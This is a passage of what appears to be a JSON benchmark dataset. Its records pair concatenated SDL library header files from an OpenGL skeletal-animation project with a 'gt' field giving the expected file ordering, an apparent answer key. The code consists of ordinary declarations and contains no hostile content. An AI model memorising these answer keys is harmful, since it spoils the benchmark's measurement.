            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_stdinc.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_loadso.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_stdinc.h'\n:\n\n\n\n#ifndef _SDL_stdinc_h\n#define _SDL_stdinc_h\n\n#include \"SDL_config.h\"\n\n#ifdef HAVE_SYS_TYPES_H\n#include <sys/types.h>\n#endif\n#ifdef HAVE_STDIO_H\n#include <stdio.h>\n#endif\n#if defined(STDC_HEADERS)\n# include <stdlib.h>\n# include <stddef.h>\n# include <stdarg.h>\n#else\n# if defined(HAVE_STDLIB_H)\n#  include <stdlib.h>\n# elif defined(HAVE_MALLOC_H)\n#  include <malloc.h>\n# endif\n# if defined(HAVE_STDDEF_H)\n#  include <stddef.h>\n# endif\n# if defined(HAVE_STDARG_H)\n#  include <stdarg.h>\n# endif\n#endif\n#ifdef HAVE_STRING_H\n# if !defined(STDC_HEADERS) && defined(HAVE_MEMORY_H)\n#  include <memory.h>\n# endif\n# include <string.h>\n#endif\n#ifdef HAVE_STRINGS_H\n# include <strings.h>\n#endif\n#if defined(HAVE_INTTYPES_H)\n# include <inttypes.h>\n#elif defined(HAVE_STDINT_H)\n# include <stdint.h>\n#endif\n#ifdef HAVE_CTYPE_H\n# include <ctype.h>\n#endif\n#ifdef HAVE_MATH_H\n# if defined(__WINRT__)\n\n#  define _USE_MATH_DEFINES\n# endif\n# include <math.h>\n#endif\n#ifdef HAVE_FLOAT_H\n# include <float.h>\n#endif\n\n\n#define SDL_arraysize(array)    (sizeof(array)/sizeof(array[0]))\n#define SDL_TABLESIZE(table)    SDL_arraysize(table)\n\n\n#define SDL_STRINGIFY_ARG(arg)  #arg\n\n\n\n#ifdef __cplusplus\n#define SDL_reinterpret_cast(type, expression) reinterpret_cast<type>(expression)\n#define SDL_static_cast(type, expression) static_cast<type>(expression)\n#define SDL_const_cast(type, expression) const_cast<type>(expression)\n#else\n#define SDL_reinterpret_cast(type, expression) ((type)(expression))\n#define SDL_static_cast(type, expression) ((type)(expression))\n#define SDL_const_cast(type, expression) ((type)(expression))\n#endif\n\n#define SDL_FOURCC(A, B, C, D) \\\n    ((SDL_static_cast(Uint32, SDL_static_cast(Uint8, (A))) << 0) | \\\n     (SDL_static_cast(Uint32, SDL_static_cast(Uint8, (B))) << 8) | \\\n     (SDL_static_cast(Uint32, SDL_static_cast(Uint8, (C))) << 16) | \\\n     (SDL_static_cast(Uint32, SDL_static_cast(Uint8, (D))) << 24))\n\n\n\n\ntypedef enum\n{\n    SDL_FALSE = 0,\n    SDL_TRUE = 1\n} SDL_bool;\n\n\ntypedef int8_t Sint8;\n\ntypedef uint8_t Uint8;\n\ntypedef int16_t Sint16;\n\ntypedef uint16_t Uint16;\n\ntypedef int32_t Sint32;\n\ntypedef uint32_t Uint32;\n\n\ntypedef int64_t Sint64;\n\ntypedef uint64_t Uint64;\n\n\n#ifndef SDL_PRIs64\n#ifdef PRIs64\n#define SDL_PRIs64 PRIs64\n#elif defined(__WIN32__)\n#define SDL_PRIs64 \"I64d\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIs64 \"ld\"\n#else\n#define SDL_PRIs64 \"lld\"\n#endif\n#endif\n#ifndef SDL_PRIu64\n#ifdef PRIu64\n#define SDL_PRIu64 PRIu64\n#elif defined(__WIN32__)\n#define SDL_PRIu64 \"I64u\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIu64 \"lu\"\n#else\n#define SDL_PRIu64 \"llu\"\n#endif\n#endif\n#ifndef SDL_PRIx64\n#ifdef PRIx64\n#define SDL_PRIx64 PRIx64\n#elif defined(__WIN32__)\n#define SDL_PRIx64 \"I64x\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIx64 \"lx\"\n#else\n#define SDL_PRIx64 \"llx\"\n#endif\n#endif\n#ifndef SDL_PRIX64\n#ifdef PRIX64\n#define SDL_PRIX64 PRIX64\n#elif defined(__WIN32__)\n#define SDL_PRIX64 \"I64X\"\n#elif defined(__LINUX__) && defined(__LP64__)\n#define SDL_PRIX64 \"lX\"\n#else\n#define SDL_PRIX64 \"llX\"\n#endif\n#endif\n\n\n#ifdef SDL_DISABLE_ANALYZE_MACROS\n#define SDL_IN_BYTECAP(x)\n#define SDL_INOUT_Z_CAP(x)\n#define SDL_OUT_Z_CAP(x)\n#define SDL_OUT_CAP(x)\n#define SDL_OUT_BYTECAP(x)\n#define SDL_OUT_Z_BYTECAP(x)\n#define SDL_PRINTF_FORMAT_STRING\n#define SDL_SCANF_FORMAT_STRING\n#define SDL_PRINTF_VARARG_FUNC( fmtargnumber )\n#define SDL_SCANF_VARARG_FUNC( fmtargnumber )\n#else\n#if defined(_MSC_VER) && (_MSC_VER >= 1600)\n#include <sal.h>\n\n#define SDL_IN_BYTECAP(x) _In_bytecount_(x)\n#define SDL_INOUT_Z_CAP(x) _Inout_z_cap_(x)\n#define SDL_OUT_Z_CAP(x) _Out_z_cap_(x)\n#define SDL_OUT_CAP(x) _Out_cap_(x)\n#define SDL_OUT_BYTECAP(x) _Out_bytecap_(x)\n#define SDL_OUT_Z_BYTECAP(x) _Out_z_bytecap_(x)\n\n#define SDL_PRINTF_FORMAT_STRING _Printf_format_string_\n#define SDL_SCANF_FORMAT_STRING _Scanf_format_string_impl_\n#else\n#define SDL_IN_BYTECAP(x)\n#define SDL_INOUT_Z_CAP(x)\n#define SDL_OUT_Z_CAP(x)\n#define SDL_OUT_CAP(x)\n#define SDL_OUT_BYTECAP(x)\n#define SDL_OUT_Z_BYTECAP(x)\n#define SDL_PRINTF_FORMAT_STRING\n#define SDL_SCANF_FORMAT_STRING\n#endif\n#if defined(__GNUC__)\n#define SDL_PRINTF_VARARG_FUNC( fmtargnumber ) __attribute__ (( format( __printf__, fmtargnumber, fmtargnumber+1 )))\n#define SDL_SCANF_VARARG_FUNC( fmtargnumber ) __attribute__ (( format( __scanf__, fmtargnumber, fmtargnumber+1 )))\n#else\n#define SDL_PRINTF_VARARG_FUNC( fmtargnumber )\n#define SDL_SCANF_VARARG_FUNC( fmtargnumber )\n#endif\n#endif\n\n#define SDL_COMPILE_TIME_ASSERT(name, x)               \\\n       typedef int SDL_dummy_ ## name[(x) * 2 - 1]\n\n#ifndef DOXYGEN_SHOULD_IGNORE_THIS\nSDL_COMPILE_TIME_ASSERT(uint8, sizeof(Uint8) == 1);\nSDL_COMPILE_TIME_ASSERT(sint8, sizeof(Sint8) == 1);\nSDL_COMPILE_TIME_ASSERT(uint16, sizeof(Uint16) == 2);\nSDL_COMPILE_TIME_ASSERT(sint16, sizeof(Sint16) == 2);\nSDL_COMPILE_TIME_ASSERT(uint32, sizeof(Uint32) == 4);\nSDL_COMPILE_TIME_ASSERT(sint32, sizeof(Sint32) == 4);\nSDL_COMPILE_TIME_ASSERT(uint64, sizeof(Uint64) == 8);\nSDL_COMPILE_TIME_ASSERT(sint64, sizeof(Sint64) == 8);\n#endif\n\n\n\n\n\n#ifndef DOXYGEN_SHOULD_IGNORE_THIS\n#if !defined(__ANDROID__)\n\ntypedef enum\n{\n    DUMMY_ENUM_VALUE\n} SDL_DUMMY_ENUM;\n\nSDL_COMPILE_TIME_ASSERT(enum, sizeof(SDL_DUMMY_ENUM) == sizeof(int));\n#endif\n#endif\n\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#if defined(HAVE_ALLOCA) && !defined(alloca)\n# if defined(HAVE_ALLOCA_H)\n#  include <alloca.h>\n# elif defined(__GNUC__)\n#  define alloca __builtin_alloca\n# elif defined(_MSC_VER)\n#  include <malloc.h>\n#  define alloca _alloca\n# elif defined(__WATCOMC__)\n#  include <malloc.h>\n# elif defined(__BORLANDC__)\n#  include <malloc.h>\n# elif defined(__DMC__)\n#  include <stdlib.h>\n# elif defined(__AIX__)\n#pragma alloca\n# elif defined(__MRC__)\nvoid *alloca(unsigned);\n# else\nchar *alloca();\n# endif\n#endif\n#ifdef HAVE_ALLOCA\n#define SDL_stack_alloc(type, count)    (type*)alloca(sizeof(type)*(count))\n#define SDL_stack_free(data)\n#else\n#define SDL_stack_alloc(type, count)    (type*)SDL_malloc(sizeof(type)*(count))\n#define SDL_stack_free(data)            SDL_free(data)\n#endif\n\nextern DECLSPEC void *SDLCALL SDL_malloc(size_t size);\nextern DECLSPEC void *SDLCALL SDL_calloc(size_t nmemb, size_t size);\nextern DECLSPEC void *SDLCALL SDL_realloc(void *mem, size_t size);\nextern DECLSPEC void SDLCALL SDL_free(void *mem);\n\nextern DECLSPEC char *SDLCALL SDL_getenv(const char *name);\nextern DECLSPEC int SDLCALL SDL_setenv(const char *name, const char *value, int overwrite);\n\nextern DECLSPEC void SDLCALL SDL_qsort(void *base, size_t nmemb, size_t size, int (*compare) (const void *, const void *));\n\nextern DECLSPEC int SDLCALL SDL_abs(int x);\n\n\n\n#define SDL_min(x, y) (((x) < (y)) ? (x) : (y))\n#define SDL_max(x, y) (((x) > (y)) ? (x) : (y))\n\nextern DECLSPEC int SDLCALL SDL_isdigit(int x);\nextern DECLSPEC int SDLCALL SDL_isspace(int x);\nextern DECLSPEC int SDLCALL SDL_toupper(int x);\nextern DECLSPEC int SDLCALL SDL_tolower(int x);\n\nextern DECLSPEC void *SDLCALL SDL_memset(SDL_OUT_BYTECAP(len) void *dst, int c, size_t len);\n\n#define SDL_zero(x) SDL_memset(&(x), 0, sizeof((x)))\n#define SDL_zerop(x) SDL_memset((x), 0, sizeof(*(x)))\n\n\nSDL_FORCE_INLINE void SDL_memset4(void *dst, Uint32 val, size_t dwords)\n{\n#if defined(__GNUC__) && defined(i386)\n    int u0, u1, u2;\n    __asm__ __volatile__ (\n        \"cld \\n\\t\"\n        \"rep ; stosl \\n\\t\"\n        : \"=&D\" (u0), \"=&a\" (u1), \"=&c\" (u2)\n        : \"0\" (dst), \"1\" (val), \"2\" (SDL_static_cast(Uint32, dwords))\n        : \"memory\"\n    );\n#else\n    size_t _n = (dwords + 3) / 4;\n    Uint32 *_p = SDL_static_cast(Uint32 *, dst);\n    Uint32 _val = (val);\n    if (dwords == 0)\n        return;\n    switch (dwords % 4)\n    {\n        case 0: do {    *_p++ = _val;\n        case 3:         *_p++ = _val;\n        case 2:         *_p++ = _val;\n        case 1:         *_p++ = _val;\n        } while ( --_n );\n    }\n#endif\n}\n\n\nextern DECLSPEC void *SDLCALL SDL_memcpy(SDL_OUT_BYTECAP(len) void *dst, SDL_IN_BYTECAP(len) const void *src, size_t len);\n\nextern DECLSPEC void *SDLCALL SDL_memmove(SDL_OUT_BYTECAP(len) void *dst, SDL_IN_BYTECAP(len) const void *src, size_t len);\nextern DECLSPEC int SDLCALL SDL_memcmp(const void *s1, const void *s2, size_t len);\n\nextern DECLSPEC size_t SDLCALL SDL_wcslen(const wchar_t *wstr);\nextern DECLSPEC size_t SDLCALL SDL_wcslcpy(SDL_OUT_Z_CAP(maxlen) wchar_t *dst, const wchar_t *src, size_t maxlen);\nextern DECLSPEC size_t SDLCALL SDL_wcslcat(SDL_INOUT_Z_CAP(maxlen) wchar_t *dst, const wchar_t *src, size_t maxlen);\n\nextern DECLSPEC size_t SDLCALL SDL_strlen(const char *str);\nextern DECLSPEC size_t SDLCALL SDL_strlcpy(SDL_OUT_Z_CAP(maxlen) char *dst, const char *src, size_t maxlen);\nextern DECLSPEC size_t SDLCALL SDL_utf8strlcpy(SDL_OUT_Z_CAP(dst_bytes) char *dst, const char *src, size_t dst_bytes);\nextern DECLSPEC size_t SDLCALL SDL_strlcat(SDL_INOUT_Z_CAP(maxlen) char *dst, const char *src, size_t maxlen);\nextern DECLSPEC char *SDLCALL SDL_strdup(const char *str);\nextern DECLSPEC char *SDLCALL SDL_strrev(char *str);\nextern DECLSPEC char *SDLCALL SDL_strupr(char *str);\nextern DECLSPEC char *SDLCALL SDL_strlwr(char *str);\nextern DECLSPEC char *SDLCALL SDL_strchr(const char *str, int c);\nextern DECLSPEC char *SDLCALL SDL_strrchr(const char *str, int c);\nextern DECLSPEC char *SDLCALL SDL_strstr(const char *haystack, const char *needle);\n\nextern DECLSPEC char *SDLCALL SDL_itoa(int value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_uitoa(unsigned int value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_ltoa(long value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_ultoa(unsigned long value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_lltoa(Sint64 value, char *str, int radix);\nextern DECLSPEC char *SDLCALL SDL_ulltoa(Uint64 value, char *str, int radix);\n\nextern DECLSPEC int SDLCALL SDL_atoi(const char *str);\nextern DECLSPEC double SDLCALL SDL_atof(const char *str);\nextern DECLSPEC long SDLCALL SDL_strtol(const char *str, char **endp, int base);\nextern DECLSPEC unsigned long SDLCALL SDL_strtoul(const char *str, char **endp, int base);\nextern DECLSPEC Sint64 SDLCALL SDL_strtoll(const char *str, char **endp, int base);\nextern DECLSPEC Uint64 SDLCALL SDL_strtoull(const char *str, char **endp, int base);\nextern DECLSPEC double SDLCALL SDL_strtod(const char *str, char **endp);\n\nextern DECLSPEC int SDLCALL SDL_strcmp(const char *str1, const char *str2);\nextern DECLSPEC int SDLCALL SDL_strncmp(const char *str1, const char *str2, size_t maxlen);\nextern DECLSPEC int SDLCALL SDL_strcasecmp(const char *str1, const char *str2);\nextern DECLSPEC int SDLCALL SDL_strncasecmp(const char *str1, const char *str2, size_t len);\n\nextern DECLSPEC int SDLCALL SDL_sscanf(const char *text, SDL_SCANF_FORMAT_STRING const char *fmt, ...) SDL_SCANF_VARARG_FUNC(2);\nextern DECLSPEC int SDLCALL SDL_vsscanf(const char *text, const char *fmt, va_list ap);\nextern DECLSPEC int SDLCALL SDL_snprintf(SDL_OUT_Z_CAP(maxlen) char *text, size_t maxlen, SDL_PRINTF_FORMAT_STRING const char *fmt, ... ) SDL_PRINTF_VARARG_FUNC(3);\nextern DECLSPEC int SDLCALL SDL_vsnprintf(SDL_OUT_Z_CAP(maxlen) char *text, size_t maxlen, const char *fmt, va_list ap);\n\n#ifndef HAVE_M_PI\n#ifndef M_PI\n#define M_PI    3.14159265358979323846264338327950288\n#endif\n#endif\n\nextern DECLSPEC double SDLCALL SDL_acos(double x);\nextern DECLSPEC double SDLCALL SDL_asin(double x);\nextern DECLSPEC double SDLCALL SDL_atan(double x);\nextern DECLSPEC double SDLCALL SDL_atan2(double x, double y);\nextern DECLSPEC double SDLCALL SDL_ceil(double x);\nextern DECLSPEC double SDLCALL SDL_copysign(double x, double y);\nextern DECLSPEC double SDLCALL SDL_cos(double x);\nextern DECLSPEC float SDLCALL SDL_cosf(float x);\nextern DECLSPEC double SDLCALL SDL_fabs(double x);\nextern DECLSPEC double SDLCALL SDL_floor(double x);\nextern DECLSPEC double SDLCALL SDL_log(double x);\nextern DECLSPEC double SDLCALL SDL_pow(double x, double y);\nextern DECLSPEC double SDLCALL SDL_scalbn(double x, int n);\nextern DECLSPEC double SDLCALL SDL_sin(double x);\nextern DECLSPEC float SDLCALL SDL_sinf(float x);\nextern DECLSPEC double SDLCALL SDL_sqrt(double x);\nextern DECLSPEC float SDLCALL SDL_sqrtf(float x);\nextern DECLSPEC double SDLCALL SDL_tan(double x);\nextern DECLSPEC float SDLCALL SDL_tanf(float x);\n\n\n#define SDL_ICONV_ERROR     (size_t)-1\n#define SDL_ICONV_E2BIG     (size_t)-2\n#define SDL_ICONV_EILSEQ    (size_t)-3\n#define SDL_ICONV_EINVAL    (size_t)-4\n\n\ntypedef struct _SDL_iconv_t *SDL_iconv_t;\nextern DECLSPEC SDL_iconv_t SDLCALL SDL_iconv_open(const char *tocode,\n                                                   const char *fromcode);\nextern DECLSPEC int SDLCALL SDL_iconv_close(SDL_iconv_t cd);\nextern DECLSPEC size_t SDLCALL SDL_iconv(SDL_iconv_t cd, const char **inbuf,\n                                         size_t * inbytesleft, char **outbuf,\n                                         size_t * outbytesleft);\n\nextern DECLSPEC char *SDLCALL SDL_iconv_string(const char *tocode,\n                                               const char *fromcode,\n                                               const char *inbuf,\n                                               size_t inbytesleft);\n#define SDL_iconv_utf8_locale(S)    SDL_iconv_string(\"\", \"UTF-8\", S, SDL_strlen(S)+1)\n#define SDL_iconv_utf8_ucs2(S)      (Uint16 *)SDL_iconv_string(\"UCS-2-INTERNAL\", \"UTF-8\", S, SDL_strlen(S)+1)\n#define SDL_iconv_utf8_ucs4(S)      (Uint32 *)SDL_iconv_string(\"UCS-4-INTERNAL\", \"UTF-8\", S, SDL_strlen(S)+1)\n\n\n#if defined(__clang_analyzer__) && !defined(SDL_DISABLE_ANALYZE_MACROS)\n#define SDL_malloc malloc\n#define SDL_calloc calloc\n#define SDL_realloc realloc\n#define SDL_free free\n#define SDL_memset memset\n#define SDL_memcpy memcpy\n#define SDL_memmove memmove\n#define SDL_memcmp memcmp\n#define SDL_strlen strlen\n#define SDL_strlcpy strlcpy\n#define SDL_strlcat strlcat\n#define SDL_strdup strdup\n#define SDL_strchr strchr\n#define SDL_strrchr strrchr\n#define SDL_strstr strstr\n#define SDL_strcmp strcmp\n#define SDL_strncmp strncmp\n#define SDL_strcasecmp strcasecmp\n#define SDL_strncasecmp strncasecmp\n#define SDL_sscanf sscanf\n#define SDL_vsscanf vsscanf\n#define SDL_snprintf snprintf\n#define SDL_vsnprintf vsnprintf\n#endif\n\nSDL_FORCE_INLINE void *SDL_memcpy4(SDL_OUT_BYTECAP(dwords*4) void *dst, SDL_IN_BYTECAP(dwords*4) const void *src, size_t dwords)\n{\n    return SDL_memcpy(dst, src, dwords * 4);\n}\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_loadso.h'\n:\n\n\n\n#ifndef _SDL_loadso_h\n#define _SDL_loadso_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nextern DECLSPEC void *SDLCALL SDL_LoadObject(const char *sofile);\n\n\nextern DECLSPEC void *SDLCALL SDL_LoadFunction(void *handle,\n                                               const char *name);\n\n\nextern DECLSPEC void SDLCALL SDL_UnloadObject(void *handle);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_stdinc.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_loadso.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_stdinc.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_loadso.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_stdinc.h'\n:\n\n\n\n#ifndef _SDL_stdinc_h\n#define _SDL_stdinc_h\n\n#include \"SDL_config.h\"\n\n#ifdef HAVE_SYS_TYPES_H\n#include <sys/types.h>\n#endif\n#ifdef HAVE_STDIO_H\n#include <stdio.h>\n#endif\n#if defined(STDC_HEADERS)\n# include <stdlib.h>\n# include <stddef.h>\n# include <stdarg.h>\n#else\n# if defined(HAVE_STDLIB_H)\n#  include <stdlib.h>\n# elif defined(HAVE_MALLOC_H)\n#  include <malloc.h>\n# endif\n# if defined(HAVE_STDDEF_H)\n#  include <stddef.h>\n# endif\n# if defined(HAVE_STDARG_H)\n#  include <stdarg.h>\n# endif\n#endif\n#ifdef HAVE_STRING_H\n# if !defined(STDC_HEADERS) && defined(HAVE_MEMORY_H)\n#  include <memory.h>\n# endif\n# include <string.h>\n#endif\n#ifdef HAVE_STRINGS_H\n# include <strings.h>\n#endif\n#if defined(HAVE_INTTYPES_H)\n# include <inttypes.h>\n#elif defined(HAVE_STDINT_H)\n# include <stdint.h>\n#endif\n#ifdef HAVE_CTYPE_H\n# include <ctype.h>\n#endif\n#ifdef HAVE_MATH_H\n# if defined(__WINRT__)\n\n#  define _USE_MATH_DEFINES\n# endif\n# include <math.h>\n#endif\n#ifdef HAVE_FLOAT_H\n# include <float.h>\n#endif\n\n\n#define SDL_arraysize(array)    (sizeof(array)/sizeof(array[0]))\n#define SDL_TABLESIZE(table)    SDL_arraysize(table)\n\n\n#define SDL_STRINGIFY_ARG(arg)  #arg\n\n\n\n#ifdef __cplusplus\n#define SDL_reinterpret_cast(type, expression) reinterpret_cast<type>(expression)\n#define SDL_static_cast(type, expression) static_cast<type>(expression)\n#define SDL_const_cast(type, expression) const_cast<type>(expression)\n#else\n#define SDL_reinterpret_cast(type, expression) ((type)(expression))\n#define SDL_static_cast(type, expression) ((type)(expression))\n#define SDL_const_cast(type, expression) ((type)(expression))\n#endif\n\n#define SDL_FOURCC(A, B, C, D) \\\n    ((SDL_static_cast(Uint32, SDL_static_cast(Uint8, (A))) << 0) | \\\n     (SDL_static_cast(Uint32, SDL_static_cast(Uint8, (B))) << 8) | \\\n     